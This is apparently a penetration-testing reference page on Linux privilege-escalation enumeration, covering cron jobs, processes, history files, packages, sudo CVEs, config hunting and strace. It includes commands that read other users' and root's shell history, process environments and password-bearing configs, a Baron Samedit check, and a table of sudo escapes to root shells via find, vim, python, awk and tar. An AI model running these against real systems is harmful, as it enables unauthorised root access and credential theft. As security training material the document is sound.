---
title: 'Services & Internals Enumeration'
description: 'Linux privilege escalation services and internals enumeration — running processes, installed packages, cron jobs, network internals, command history, and system call tracing.'
---

# Services & Internals Enumeration

After environment enumeration, dig deeper into the host internals — running services, scheduled tasks, installed software, and user activity. This phase often reveals the actual escalation vector.

## Priority Checklist

| # | Check | Command |
|:--|:------|:--------|
| 1 | Cron jobs (all locations) | `cat /etc/crontab && ls -la /etc/cron.*` |
| 2 | Running processes as root | `ps aux \| grep root` |
| 3 | Sudo version (CVE check) | `sudo -V` |
| 4 | Installed packages | `dpkg -l` or `rpm -qa` |
| 5 | Bash history (all users) | `cat ~/.bash_history` |
| 6 | Currently logged in users | `w` |
| 7 | Listening services (internal only?) | `ss -tulnp` |
| 8 | Hosts file entries | `cat /etc/hosts` |
| 9 | Interesting scripts | `find / -name "*.sh" 2>/dev/null` |
| 10 | GTFOBins binaries | Check installed bins against GTFOBins |

---

## 1. Network Internals

### Interfaces & Hosts

```bash
# Network interfaces — dual-homed hosts = pivoting
ip a
# or
ifconfig

# Hosts file — internal hostnames, other systems
cat /etc/hosts
```

!!! tip "Hosts File"
    The `/etc/hosts` file can reveal internal hostnames, other servers in the environment, and domain names that aren't publicly resolvable. Note everything for later pivoting.

### Active Users & Login History

```bash
# Who is currently logged in (and from where)
w

# Alternative
who

# Last login time for all users — shows usage patterns
lastlog

# Recent login history
last -a | head -20

# Failed login attempts (if readable)
lastb 2>/dev/null | head -20
```

**Why this matters**: Active users = potential for session hijacking. Infrequent logins = messy home dirs with leftover credentials.

---

## 2. Command History

### Bash History

```bash
# Current user's history — passwords, SSH commands, creds
history

# Or read the file directly
cat ~/.bash_history

# All users' bash history (if readable)
find /home -name ".bash_history" -exec echo "=== {} ===" \; -exec cat {} \; 2>/dev/null

# Root's history (if readable)
cat /root/.bash_history 2>/dev/null
```

**What to look for**: passwords passed as arguments, `ssh` commands with hosts/keys, `mysql -u root -p`, `curl` with credentials, `git` operations, `cron` setup commands.

### All History Files

```bash
# Find all history files (bash, mysql, python, etc.)
find / -type f \( -name "*_hist" -o -name "*_history" \) -exec ls -l {} \; 2>/dev/null
```

| History File | Contains |
|:-------------|:---------|
| `.bash_history` | Shell commands |
| `.mysql_history` | Database queries (may have passwords) |
| `.python_history` | Python REPL commands |
| `.lesshst` | Files viewed with `less` |
| `.viminfo` | Files edited, search patterns, registers |
| `.wget-hsts` | URLs accessed with wget |

---

## 3. Cron Jobs

Cron jobs run as the owning user (often root). Misconfigured cron = privilege escalation via writable scripts, relative paths, or wildcard injection.

### Enumerate All Cron Locations

```bash
# System crontab
cat /etc/crontab

# Per-user crontabs
ls -la /var/spool/cron/crontabs/ 2>/dev/null
# or
ls -la /var/spool/cron/ 2>/dev/null

# Cron directories
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# Systemd timers (modern replacement for cron)
systemctl list-timers --all 2>/dev/null
```

!!! tip "Cron Escalation Vectors"
    Look for:

    - Scripts run by root that are **writable by your user**
    - Cron jobs using **relative paths** (hijack via PATH manipulation)
    - Cron jobs using **wildcards** (`*`) with tar, rsync, etc. (wildcard injection)
    - Missing scripts referenced in crontab (create them yourself)

### Monitor for Hidden Cron Jobs

```bash
# Use pspy to catch processes you can't see in crontab
# Download: https://github.com/DominicBreuker/pspy
./pspy64

# Quick alternative without tools — watch for new processes
watch -n 1 'ps aux | grep -v watch'
```

---

## 4. Running Processes & Services

### Process Enumeration

```bash
# All running processes with full details
ps aux

# Processes running as root (your targets)
ps aux | grep root

# Process tree (shows parent-child relationships)
ps auxf

# Specific service check
ps aux | grep -i "apache\|nginx\|mysql\|postgres\|docker\|cron"
```

### /proc Filesystem

The `/proc` virtual filesystem exposes process details. Useful for seeing command-line arguments of running processes (may contain passwords).

```bash
# Command lines of all running processes
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr "\0" " " | tr "\n" "\n"

# Or more readably
cat /proc/*/cmdline 2>/dev/null | tr "\0" " " | tr "\n\n" "\n"

# Specific process details
ls -la /proc/[PID]/
cat /proc/[PID]/cmdline | tr "\0" " "
cat /proc/[PID]/environ | tr "\0" "\n"   # Environment variables (may have secrets!)
```

### Systemd Services

```bash
# List all services
systemctl list-units --type=service

# List enabled services (start on boot)
systemctl list-unit-files --type=service | grep enabled

# Check specific service config
systemctl cat servicename
```

---

## 5. Installed Software & Packages

### Package Enumeration

```bash
# Debian/Ubuntu
dpkg -l
apt list --installed 2>/dev/null

# RHEL/CentOS/Fedora
rpm -qa
yum list installed 2>/dev/null

# Save to file for later analysis
dpkg -l | tee installed_pkgs.list
```

### Sudo Version (CVE Check)

```bash
sudo -V
```

#### Known Sudo CVEs

| Version | CVE | Description |
|:--------|:----|:-----------|
| < 1.8.28 | CVE-2019-14287 | `sudo -u#-1` bypasses runas restriction → root |
| 1.8.2 – 1.8.31p2 | CVE-2021-3156 (Baron Samedit) | Heap overflow → root (no sudo access needed) |
| < 1.9.5p2 | CVE-2021-23240 | selinux role bypass |

!!! warning "Baron Samedit (CVE-2021-3156)"
    Affects sudo versions 1.8.2 through 1.8.31p2 and 1.9.0 through 1.9.5p1. Extremely reliable exploit — if the version is vulnerable, this is likely your path.

    ```bash
    # Quick check — if this segfaults, it's likely vulnerable
    sudoedit -s '\' $(python3 -c 'print("A"*1000)')
    ```

### Available Binaries & Tools

```bash
# Check for useful tools already on the system
which nmap nc ncat netcat curl wget python python3 perl ruby gcc g++ cc 2>/dev/null

# Compilers available? (can compile kernel exploits on-target)
which gcc g++ cc make 2>/dev/null

# List all binaries in standard paths
ls -la /usr/local/bin/ /usr/bin/ /usr/sbin/ /bin/ /sbin/ 2>/dev/null
```

### GTFOBins Cross-Reference

[GTFOBins](https://gtfobins.github.io/) lists binaries that can be abused for privilege escalation (especially with SUID/sudo).

```bash
# Generate installed package list first
dpkg -l | awk '{print $2}' > installed_pkgs.list

# Cross-reference with GTFOBins (requires internet)
for i in $(curl -s https://gtfobins.github.io/+/info.json | jq -r '.[].functions | keys[]' 2>/dev/null); do
    if grep -qw "$i" installed_pkgs.list 2>/dev/null; then
        echo "[!] GTFOBin found: $i"
    fi
done
```

!!! tip "Manual GTFOBins Check"
    Even without internet on the target, check these commonly abusable binaries:

    | Binary | Sudo Abuse | SUID Abuse |
    |:-------|:-----------|:-----------|
    | `find` | `sudo find / -exec /bin/bash \;` | SUID find → shell |
    | `vim` / `vi` | `sudo vim -c ':!bash'` | — |
    | `python` | `sudo python -c 'import os; os.system("/bin/bash")'` | — |
    | `awk` | `sudo awk 'BEGIN {system("/bin/bash")}'` | — |
    | `nmap` | `sudo nmap --interactive` (old) | — |
    | `less` / `more` | `sudo less /etc/shadow` → `!bash` | — |
    | `cp` / `mv` | Overwrite `/etc/passwd` or `/etc/shadow` | — |
    | `env` | `sudo env /bin/bash` | — |
    | `tar` | `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash` | Wildcard injection |

---

## 6. Configuration Files & Scripts

### Configuration File Hunting

```bash
# Find all config files (readable by current user)
find / -type f \( -name "*.conf" -o -name "*.config" -o -name "*.cnf" -o -name "*.cfg" \) -exec ls -l {} \; 2>/dev/null

# Search config files for passwords
find / -type f \( -name "*.conf" -o -name "*.config" \) -exec grep -li "password\|passwd\|pass\|pwd" {} \; 2>/dev/null
```

#### High-Value Config Files

| File | Contains |
|:-----|:---------|
| `/etc/shadow` | Password hashes (need root or shadow group) |
| `/etc/samba/smb.conf` | Samba config, shares, potentially passwords |
| `/etc/mysql/my.cnf` | MySQL config |
| `/var/www/*/wp-config.php` | WordPress DB credentials |
| `/var/www/*/.env` | Laravel/app environment secrets |
| `/etc/apache2/sites-enabled/*` | Apache vhost configs |
| `/etc/nginx/sites-enabled/*` | Nginx vhost configs |
| `/opt/*/config.*` | Application-specific configs |
| `/etc/openvpn/*.conf` | VPN configs with potential creds |

### Script Hunting

```bash
# Find shell scripts (exclude system paths for noise reduction)
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share\|lib"

# Find world-writable scripts (potential cron abuse)
find / -type f -name "*.sh" -writable 2>/dev/null

# Find scripts owned by root but writable by us
find / -type f -name "*.sh" -user root -writable 2>/dev/null
```

!!! warning "Writable Scripts Run by Root"
    If you find a script that is writable by your user AND executed by root (via cron, systemd, or manual execution), you can inject a reverse shell or add your user to sudoers.

---

## 7. System Call Tracing (strace / ltrace)

Use `strace` to trace system calls of running programs — useful for finding credentials passed to processes or files accessed by services.

```bash
# Trace a command and look for interesting syscalls
strace -f ping -c1 10.10.10.1 2>&1 | grep -i "open\|connect\|read\|write"

# Trace a running process by PID
strace -p PID -f 2>&1

# Save output for analysis
strace -o /tmp/trace.txt -f -p PID

# Trace library calls instead
ltrace ./binary 2>&1
```

**What to look for**: `open()` calls to config files, `connect()` calls with IPs/ports, `read()`/`write()` of credential files.

---

## 8. Useful One-Liners

```bash
# Find SUID binaries (covered in depth in permissions enumeration)
find / -perm -4000 -type f 2>/dev/null

# Find writable files outside home directory
find / -writable -type f 2>/dev/null | grep -v "proc\|sys\|home"

# Find files modified in last 10 minutes (catch active cron jobs)
find / -mmin -10 -type f 2>/dev/null | grep -v "proc\|sys\|run"

# Find files modified in last 24 hours
find / -mtime 0 -type f 2>/dev/null | grep -v "proc\|sys\|run"

# List all open files / network connections
lsof -i 2>/dev/null
lsof -u root 2>/dev/null

# Capabilities on binaries (potential escalation)
getcap -r / 2>/dev/null
```